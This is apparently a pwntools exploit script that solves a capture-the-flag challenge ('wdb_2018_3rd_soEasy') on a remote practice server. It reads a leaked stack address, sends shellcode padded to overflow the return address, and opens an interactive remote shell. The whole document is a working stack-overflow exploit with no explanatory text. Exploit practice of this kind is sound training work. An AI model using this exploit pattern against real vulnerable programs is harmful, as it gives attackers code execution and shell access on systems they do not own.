from pwn import *

context(log_level='debug')

#io=process("./wdb_2018_3rd_soEasy")
io=remote("node3.buuoj.cn",25670)

io.recvuntil(b"->")

buf=int(io.recvuntil(b'\n',drop=True),16)

payload=asm(shellcraft.sh()).ljust(0x48+4,b'a')+p32(buf)

io.send(payload)

#io=remote()

io.interactive()